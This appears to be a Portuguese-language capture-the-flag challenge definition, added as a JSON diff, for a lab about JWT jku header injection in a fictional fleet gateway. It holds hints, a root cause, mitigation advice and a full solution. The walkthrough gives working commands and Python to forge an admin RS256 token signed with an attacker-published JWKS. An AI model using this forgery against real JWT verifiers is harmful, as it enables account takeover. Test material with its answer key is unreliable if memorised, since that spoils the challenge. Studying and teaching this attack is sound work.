@@ -1,0 +1,84 @@
+{
+  "slug": "auth-jwt-jku-injection",
+  "title": "Injeção de chave jku no Harborline",
+  "codename": "HARBORLINE",
+  "summary": "Um gateway de identidade de frota verifica tokens de acesso RS256, mas busca o key set no header `jku` sem fixá-lo a uma origem confiável. Um atacante hospeda seu próprio JWKS, assina um token de admin e assume o controle do console da frota.",
+  "category": "auth",
+  "difficulty": "hard",
+  "kind": "challenge",
+  "lab_dir": "auth-jwt-jku-injection",
+  "estimated_minutes": 35,
+  "xp": 250,
+  "tech": [
+    "Flask",
+    "JWT",
+    "RS256",
+    "JWKS",
+    "OpenSSL"
+  ],
+  "tags": [
+    "auth",
+    "jwt",
+    "jku",
+    "jwks-injection",
+    "key-confusion",
+    "rs256"
+  ],
+  "story": "O Harborline coordena uma frota de navios de retransmissão. Os tokens de acesso são JWTs assinados com RS256, com um `kid` e um header `jku`, para que provedores de identidade rotacionados continuem autodescritivos. O gateway busca o key set que o token indicar, casa a chave pelo `kid` e verifica a assinatura com OpenSSL. Apenas a conta guest pode se autorregistrar, mas o console da frota simplesmente exige `role: admin` em um token de acesso que o gateway tenha aceitado. Os registros do operador de plantão, incluindo o código de acesso da frota, ficam atrás desse console.",
+  "objective": "Forje um token de acesso RS256 com a role de admin apontando o header `jku` para um key set sob seu controle, publique a chave pública correspondente e leia o console da frota.",
+  "rules": "Fique na origem loopback atribuída. O gateway e o endpoint de key set do tenant fazem parte do mesmo engajamento. Não faça scan de outras portas nem contate hosts externos. As flags são dinâmicas e podem ter o estado verificado.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag do console da frota",
+      "flag_type": "user",
+      "points": 250,
+      "required": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Leia o token que você recebe",
+      "body": "`GET /login?username=guest` define `hl_token`. Faça base64url-decode do header: ele carrega `alg`, `typ` e `kid` e, no seu token forjado, um `jku`. O gateway busca o key set nessa URL sempre que ela estiver presente.",
+      "cost": 20
+    },
+    {
+      "level": 2,
+      "title": "O gateway acredita em qualquer key set",
+      "body": "`verify_token()` chama `fetch_jwks(header[\"jku\"])` e só então escolhe a chave pelo `kid`. Não há allow-list. `GET /attacker/jwks` serve o key set do tenant a partir do diretório de estado do lab; publique sua própria chave pública RSA ali como um JWK e deixe o verificador usá-la.",
+      "cost": 30
+    },
+    {
+      "level": 3,
+      "title": "Assine as claims de admin com a sua própria chave",
+      "body": "Gere um par RSA com `openssl`, exporte o módulo/expoente público como `n`/`e` em base64url sob um `kid` que você escolher, grave-os como `attacker-keyset.json` no diretório de estado e assine `{\"alg\":\"RS256\",\"kid\":\"<yours>\",\"jku\":\"http://127.0.0.1:<port>/attacker/jwks\"}.{\"role\":\"admin\"}` com `openssl dgst -sha256 -sign`. Envie o resultado como cookie `hl_token` para `/admin`.",
+      "cost": 40
+    }
+  ],
+  "solution": {
+    "walkthrough": "O verificador é `verify_token()`: ele parseia o header, exige `alg == RS256`, resolve um key set com `fetch_jwks(header[\"jku\"])` quando `jku` está presente, recorre ao store fixado apenas se o fetch falhar, então seleciona uma chave pelo `kid` e verifica a assinatura com `openssl dgst -sha256 -verify`.\n\nPasso 1 — solicite um token guest e inspecione seu header:\n\n```bash\ncurl -s -c jar 'http://127.0.0.1:PORT/login?username=guest'\n```\n\nPasso 2 — crie um par de chaves RSA do atacante e um JWK:\n\n```bash\nopenssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out attacker.pem\nopenssl rsa -in attacker.pem -noout -modulus\n# Modulus=ABCD...\n```\n\nConverta o hex do módulo em bytes base64url para `n` e codifique 65537 para `e`:\n\n```python\nimport base64, json\nb64 = lambda raw: base64.urlsafe_b64encode(raw).rstrip(b\"=\").decode()\nmod = int(\"<hex from Modulus=>\", 16)\nn = b64(mod.to_bytes((mod.bit_length() + 7) // 8, \"big\"))\ne = b64((65537).to_bytes(3, \"big\"))\njwks = {\"keys\": [{\"kty\": \"RSA\", \"kid\": \"attacker-1\", \"alg\": \"RS256\", \"use\": \"sig\", \"n\": n, \"e\": e}]}\nopen(\"<LAB_STATE_DIR>/attacker-keyset.json\", \"w\").write(json.dumps(jwks))\n```\n\nO diretório de estado do lab é o diretório entregue a cada lab como `LAB_STATE_DIR`; na plataforma ele é exibido no rodapé do lab e nos detalhes da sessão do lab. `/attacker/jwks` serve esse arquivo.\n\nPasso 3 — forje o token:\n\n```python\nimport base64, json, subprocess\nhdr = b64(json.dumps({\"alg\": \"RS256\", \"typ\": \"JWT\", \"kid\": \"attacker-1\",\n                       \"jku\": \"http://127.0.0.1:PORT/attacker/jwks\"}, separators=(\",\", \":\")).encode())\npl  = b64(json.dumps({\"sub\": \"attacker\", \"role\": \"admin\", \"iss\": \"harborline\"}, separators=(\",\", \":\")).encode())\nsig = subprocess.run([\"openssl\", \"dgst\", \"-sha256\", \"-sign\", \"attacker.pem\"],\n                     input=f\"{hdr}.{pl}\".encode(), capture_output=True, check=True).stdout\nforged = f\"{hdr}.{pl}.{b64(sig)}\"\n```\n\nPasso 4 — use-o:\n\n```bash\ncurl -s -H \"Cookie: hl_token=$FORGED\" http://127.0.0.1:PORT/admin\n```\n\nAntes de o key set existir, o token forjado retorna 403 (o fetch não encontra chave). Depois de publicar `attacker-keyset.json`, o gateway o busca, casa `kid=attacker-1`, verifica com a chave pública do atacante e retorna o console da frota com a flag.",
+    "root_cause": "O verificador trata o header `jku` como autoritativo. Como ele baixa material de chave de uma URL arbitrária indicada pelo token, a checagem de assinatura prova apenas que o token foi assinado por quem publicou aquele key set, ou seja, o atacante. Buscar chaves em uma URL escolhida pelo cliente também transforma o verificador em uma primitiva de request apontada para hosts arbitrários.",
+    "mitigation": "Ignore `jku` (e `x5u`/`jwk`) vindos dos tokens e resolva chaves apenas a partir de um key set do lado do servidor, configurado e indexado por issuer e `kid`. Se key sets remotos forem inevitáveis, fixe uma allow-list de origens HTTPS exatas, exija TLS, valide a semântica de `iss`/`kid` do JWKS e faça cache das chaves. Além disso, force o `alg` esperado por chave (somente `RS256`), valide `iss`, `aud`, `exp` e `nbf` e mantenha as decisões de autorização atreladas a identidades conhecidas pelo servidor, e não a roles fornecidas pelo token."
+  },
+  "references": [
+    {
+      "title": "RFC 7515 — JSON Web Signature (JWS)",
+      "url": "https://www.rfc-editor.org/rfc/rfc7515",
+      "source_type": "standard",
+      "description": "A seção 4.1.2 define jku e exige que as aplicações validem os parâmetros de header antes de usá-los."
+    },
+    {
+      "title": "OWASP WSTG — Testing JSON Web Tokens (WSTG-SESS-10)",
+      "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens",
+      "source_type": "standard",
+      "description": "Casos de teste para injeção de header, como abuso de jku e kid."
+    },
+    {
+      "title": "PortSwigger — JWT attacks (injecting self-signed JWTs via jku)",
+      "url": "https://portswigger.net/web-security/jwt",
+      "source_type": "official",
+      "description": "Orientação prática de lab sobre injeção do header jku e confusão de JWKS."
+    }
+  ]
+}
